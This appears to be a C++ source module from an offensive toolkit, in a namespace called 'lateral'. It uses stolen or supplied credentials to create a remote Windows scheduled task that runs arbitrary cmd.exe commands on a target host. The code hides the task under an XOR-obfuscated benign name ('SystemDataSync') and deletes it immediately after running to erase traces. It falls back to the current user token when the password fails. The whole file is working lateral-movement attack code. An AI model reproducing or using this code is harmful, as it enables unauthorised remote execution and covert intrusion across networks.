#include "TaskExec.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <vector>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")

namespace lateral {

namespace {
    using utils::s2ws;
}

std::string TaskExec(const std::string& target, const std::string& user, const std::string& pass, const std::string& cmd) {
    HRESULT hr = S_OK;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) return "ERROR: CoCreateInstance TaskScheduler failed: " + utils::Shared::ToHex(hr);

    std::wstring wtarget = s2ws(target);
    std::wstring wuser = s2ws(user);
    std::wstring wpass = s2ws(pass);
    std::wstring wcmd = s2ws(cmd);

    _variant_t vTarget(wtarget.empty() ? NULL : wtarget.c_str());
    _variant_t vUser(wuser.empty() ? NULL : wuser.c_str());
    _variant_t vPass(wpass.empty() ? NULL : wpass.c_str());
    _variant_t vDomain;

    hr = pService->Connect(vTarget, vUser, vDomain, vPass);
    if (FAILED(hr)) {
        pService->Release();
        return "ERROR: ITaskService::Connect failed: " + utils::Shared::ToHex(hr);
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        return "ERROR: GetFolder failed: " + utils::Shared::ToHex(hr);
    }

    // Obfuscated Task Name: "SystemDataSync"
    std::wstring taskName = utils::xor_wstr(L"\x18\x66\xff\x4a\x2e\x72\xc8\x5f\x3f\x7e\xdf\x47\x25\x7c", 14);

    pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        pRootFolder->Release();
        pService->Release();
        return "ERROR: NewTask failed: " + utils::Shared::ToHex(hr);
    }

    IActionCollection* pActionCollection = NULL;
    hr = pTask->get_Actions(&pActionCollection);
    if (FAILED(hr)) {
        pTask->Release();
        pRootFolder->Release();
        pService->Release();
        return "ERROR: get_Actions failed: " + utils::Shared::ToHex(hr);
    }

    IAction* pAction = NULL;
    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollection->Release();
    if (FAILED(hr)) {
        pTask->Release();
        pRootFolder->Release();
        pService->Release();
        return "ERROR: ActionCollection::Create failed: " + utils::Shared::ToHex(hr);
    }

    IExecAction* pExecAction = NULL;
    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr)) {
        pTask->Release();
        pRootFolder->Release();
        pService->Release();
        return "ERROR: QueryInterface IExecAction failed: " + utils::Shared::ToHex(hr);
    }

    hr = pExecAction->put_Path(_bstr_t(L"cmd.exe"));
    hr = pExecAction->put_Arguments(_bstr_t((L"/c " + wcmd).c_str()));
    pExecAction->Release();

    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(taskName.c_str()),
        pTask,
        TASK_CREATE_OR_UPDATE,
        vUser,
        vPass,
        TASK_LOGON_PASSWORD,
        _variant_t(L""),
        &pRegisteredTask
    );

    if (FAILED(hr)) {
        // Fallback: try to register without password if we are using current context
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(taskName.c_str()),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegisteredTask
        );
    }

    pTask->Release();

    if (FAILED(hr)) {
        pRootFolder->Release();
        pService->Release();
        return "ERROR: RegisterTaskDefinition failed: " + utils::Shared::ToHex(hr);
    }

    hr = pRegisteredTask->Run(_variant_t(), NULL);
    pRegisteredTask->Release();

    if (FAILED(hr)) {
        pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);
        pRootFolder->Release();
        pService->Release();
        return "ERROR: Task Run failed: " + utils::Shared::ToHex(hr);
    }

    // Cleanup - maybe don't delete immediately to ensure it runs?
    // Usually it runs immediately if logon type is correct.
    pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);
    pRootFolder->Release();
    pService->Release();

    return "TASK_OK";
}

} // namespace lateral
